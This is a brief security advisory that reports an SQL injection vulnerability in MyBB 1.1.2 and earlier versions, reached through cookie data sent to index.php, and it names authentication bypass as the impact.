MyBB is prone to an SQL-injection vulnerability.

The vulnerability presents itself when user-supplied input via cookie data is passed to the 'index.php' script.

Successful exploitation can allow an attacker to bypass authentication and gain administrative access to a site. Other attacks may also be possible.

MyBB 1.1.2 and prior versions are reported vulnerable to this issue.
